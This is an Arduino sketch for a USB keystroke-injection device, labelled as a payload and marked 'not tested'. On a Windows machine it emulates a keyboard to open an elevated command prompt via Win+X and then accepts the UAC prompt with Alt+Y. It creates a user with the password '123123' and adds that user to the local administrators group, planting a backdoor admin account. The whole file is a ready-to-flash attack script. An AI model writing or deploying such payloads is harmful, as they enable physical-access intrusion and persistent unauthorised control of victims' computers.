/* -----------
 * not tested
 * ----------- */

#include <HID.h>
#include <Keyboard.h>

// Init function
// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(500);
  Keyboard.release(key);
}

void setup()
{
  // Button Code to Disable executing
  pinMode(3, INPUT_PULLUP);
  if (digitalRead(3) == LOW){
     while(1);
  }
  // Start Keyboard and Mouse
  Keyboard.begin();

  // Start Payload
  
  // Press Windows+X
  Keyboard.press(KEY_LEFT_GUI);
  delay(1000);
  Keyboard.press('x');
  Keyboard.releaseAll();
  delay(500);

  // Launch Command Prompt
  typeKey('a');
  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  delay(500);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(500);

  // Add User
  
  // Username is a name for a new user
  // Numbers is the password
  Keyboard.println("net user /add Username 123123");
  typeKey(KEY_RETURN);  
  delay(100);

  // Give User Administrator Permissions  
  Keyboard.print("net localgroup administrators Username /add");
  typeKey(KEY_RETURN);
  delay(100);

  Keyboard.print("exit");
  typeKey(KEY_RETURN);  
  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}
